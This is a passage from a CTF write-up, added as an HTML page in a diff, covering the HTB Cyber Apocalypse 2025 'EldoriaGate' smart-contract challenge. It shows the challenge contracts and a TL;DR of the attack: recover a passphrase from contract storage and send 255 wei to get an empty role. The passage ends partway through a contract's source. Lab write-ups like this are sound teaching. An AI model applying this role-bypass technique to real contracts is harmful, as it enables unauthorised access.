@@ -1,0 +1,1395 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+
+  
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="">  
+
+
+  
+  <meta property="og:type" content="website">
+  <meta property="og:description" content="EldoriaGate writeup from HTB Cyber Apocalypse CTF 2025" />
+  <meta property="og:image" content="https://wepfen.github.io/images/writeups/htb-cyber-apocalypse/brother-in-christ-role.png" />
+  <meta property="og:url" content="https://wepfen.github.io/writeups/htb-cyberapocalypse-2025-eldoriagate/">
+  <meta property="og:title" content="HTB Cyber Apocalypse CTF 2025 - EldoriaGate [blockchain]">
+  <meta property="og:site_name" content="wepfen.github.io">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta property="twitter:domain" content="wepfen.github.io">
+  <meta property="twitter:url" content="https://wepfen.github.io/writeups/htb-cyberapocalypse-2025-eldoriagate/">
+  <meta name="twitter:title" content="HTB Cyber Apocalypse CTF 2025 - EldoriaGate [blockchain]">
+  <meta name="twitter:description" content="EldoriaGate writeup from HTB Cyber Apocalypse CTF 2025">
+  <meta name="twitter:image" content="https://wepfen.github.io/images/writeups/htb-cyber-apocalypse/brother-in-christ-role.png">
+  
+  <title>
+    
+      HTB Cyber Apocalypse CTF 2025 - EldoriaGate [blockchain]
+    
+  </title>
+
+
+  <link rel="icon" type="image/gif" href="/images/oia-uia.gif" />
+   
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.9bb372a616563f9ecafd6e5ea0d7760c487f35e7358f212b258b477fbfa75f5264ef33aaffa0334383ffc444b631b8dc5c496c67b5830ab2ac1f1e226a1125c3.css" integrity="sha512-m7NyphZWP57K/W5eoNd2DEh/Nec1jyErJYtHf7&#43;nX1Jk7zOq/6AzQ4P/xES2MbjcXElsZ7WDCrKsHx4iahElww==" />
+
+  
+
+
+</head>
+
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css" integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV" crossorigin="anonymous">
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js" integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG+vnGctmUb0ZY0l8" crossorigin="anonymous"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"></script>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {
+      delimiters: [
+        {left: '$$', right: '$$', display: true},     
+        {left: '$', right: '$', display: false},  	  
+      ],
+      throwOnError : false
+    });
+  });
+</script>
+
+
+
+    
+    <body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">~/</a>
+
+
+
+
+<script src="/js/theme-toggle.f10bb0c6283b259e63664053a20ccc48c8b0980e44bceece1c10401c529c2040.js" integrity="sha256-8Quwxig7JZ5jZkBTogzMSMiwmA5EvO7OHBBAHFKcIEA="></script>
+
+<button style="float: right; background: none; outline: none;" onclick="toggleTheme()">
+
+<svg class="w-6 h-6 text-gray-800 dark:text-white theme" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
+  <path fill-rule="evenodd" d="M7.05 4.05A7 7 0 0 1 19 9c0 2.407-1.197 3.874-2.186 5.084l-.04.048C15.77 15.362 15 16.34 15 18a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1c0-1.612-.77-2.613-1.78-3.875l-.045-.056C6.193 12.842 5 11.352 5 9a7 7 0 0 1 2.05-4.95ZM9 21a1 1 0 0 1 1-1h4a1 1 0 1 1 0 2h-4a1 1 0 0 1-1-1Zm1.586-13.414A2 2 0 0 1 12 7a1 1 0 1 0 0-2 4 4 0 0 0-4 4 1 1 0 0 0 2 0 2 2 0 0 1 .586-1.414Z" clip-rule="evenodd"/>
+</svg>
+
+</button>
+
+
+
+
+
+
+<article>
+    <p class="post-meta">
+        <time datetime="2025-03-25 23:45:32 &#43;0100 CET">
+            2025-03-25
+        </time>
+    </p>
+
+    <h1>HTB Cyber Apocalypse CTF 2025 - EldoriaGate [blockchain]</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tldr">TL;DR</a></li>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#recon">Recon</a>
+      <ul>
+        <li><a href="#smart-contracts">Smart contracts</a></li>
+        <li><a href="#code-reading">Code reading</a>
+          <ul>
+            <li><a href="#setupsol">Setup.sol</a></li>
+            <li><a href="#eldoriagatesol">EldoriaGate.sol</a>
+              <ul>
+                <li><a href="#constructor">constructor</a></li>
+                <li><a href="#enter">enter</a></li>
+                <li><a href="#getvillagerroles">getVillagerRoles</a></li>
+                <li><a href="#checkusurper">checkUsurper</a></li>
+              </ul>
+            </li>
+            <li><a href="#eldoriagatekernelsol">EldoriaGateKernel.sol</a>
+              <ul>
+                <li><a href="#constructor-1">constructor</a></li>
+                <li><a href="#authenticate">authenticate</a></li>
+                <li><a href="#evaluateidentity">evaluateIdentity</a></li>
+                <li><a href="#hasrole">hasRole</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#solving">Solving</a>
+      <ul>
+        <li><a href="#get-authenticated">Get authenticated</a></li>
+        <li><a href="#have-an-empty-role">Have an empty role</a></li>
+      </ul>
+    </li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <p>EldoriaGate writeup from HTB Cyber Apocalypse CTF 2025</p>
+<blockquote>
+<p>Difficulty : Medium</p>
+</blockquote>
+<blockquote>
+<p>Team : Phreaks 2600</p>
+</blockquote>
+<blockquote>
+<p>Description : At long last, you stand before the EldoriaGate, the legendary portal, the culmination of your perilous journey. Your escape from this digital realm hinges upon passing this final, insurmountable barrier. Your fate rests upon the passage through these mythic gates. These are no mere gates of stone and steel. They are a living enchantment, a sentinel woven from ancient magic, judging all who dare approach. The Gate sees you, divining your worth, assigning your place within Eldoria&rsquo;s unyielding order. But you seek not a place within their order, but freedom beyond it. Become the Usurper. Defy the Gate&rsquo;s ancient magic. Pass through, yet leave no trace, no mark of your passing, no echo of your presence. Become the unseen, the unwritten, the legend whispered but never confirmed. Outwit the Gate. Become a phantom, a myth. Your escape, your destiny, awaits.</p>
+</blockquote>
+<blockquote>
+<p>Topics : Assembly, EVM storage</p>
+</blockquote>
+<blockquote>
+<p>Author : <a href="https://github.com/perrythepwner/">PerryThePwner</a></p>
+</blockquote>
+<h1 id="tldr">TL;DR</h1>
+<ul>
+<li>
+<p>To solve, our address (the player address) need to have an empty role which is supposed to be impossible.</p>
+</li>
+<li>
+<p>Recover the passphrase from the EldoriaGateKernel smart contract storage.</p>
+</li>
+<li>
+<p>Enter the Gate with a contribution of 255 wei resulting in giving an empty role.</p>
+</li>
+<li>
+<p>Get the flag.</p>
+</li>
+</ul>
+<h1 id="introduction">Introduction</h1>
+<p>For this challenge, there are three solidity smart contracts deployed. The &ldquo;EldoriaGate&rdquo; smart contract (which I will call <code>&quot;Gate&quot;</code> from now). And this gate rely on another smart contract &ldquo;EldoriaGateKernel&rdquo; (we will call it <code>&quot;Kernel&quot;</code>) with low level functions using assembly. This part is responsible for checking a role, authenticate or giving a role.</p>
+<h1 id="recon">Recon</h1>
+<h2 id="smart-contracts">Smart contracts</h2>
+<p>Here are the contracts.</p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">Setup.sol</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#859289;font-style:italic">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">pragma solidity</span> <span style="color:#7a8478">^</span><span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">28</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> { EldoriaGate } <span style="color:#e67e80">from</span> <span style="color:#b2c98f">&#34;./EldoriaGate.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> Setup {
+</span></span><span style="display:flex;"><span>    EldoriaGate <span style="color:#e67e80">public</span> TARGET;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">address</span> <span style="color:#e67e80">public</span> player;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span> DeployedTarget(<span style="color:#dbbc7f">address</span> at);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">bytes4</span> _secret, <span style="color:#dbbc7f">address</span> _player) {
+</span></span><span style="display:flex;"><span>        TARGET <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> EldoriaGate(_secret);
+</span></span><span style="display:flex;"><span>        player <span style="color:#7a8478">=</span> _player;
+</span></span><span style="display:flex;"><span>        emit DeployedTarget(<span style="color:#dbbc7f">address</span>(TARGET));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">isSolved</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> TARGET.checkUsurper(player);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<br>
+<details>
+  <summary style="color: #F99417; cursor: pointer">EldoriaGate.sol</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 63
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 71
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 72
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 73
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 74
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 75
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 76
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 77
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 78
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 79
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 80
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 81
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 82
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 83
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 84
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 85
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 86
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 87
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 88
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 89
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 90
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 91
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 92
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 93
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 94
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 95
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 96
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 97
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 98
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 99
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">100
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">101
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">102
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#859289;font-style:italic">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">pragma solidity</span> <span style="color:#7a8478">^</span><span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">28</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">/***
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">    Malakar 1b:22-28, Tales from Eldoria - Eldoria Gates
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">  
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">    &#34;In ages past, where Eldoria&#39;s glory shone,
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">     Ancient gates stand, where shadows turn to dust.
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">     Only the proven, with deeds and might,
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">     May join Eldoria&#39;s hallowed, guiding light.
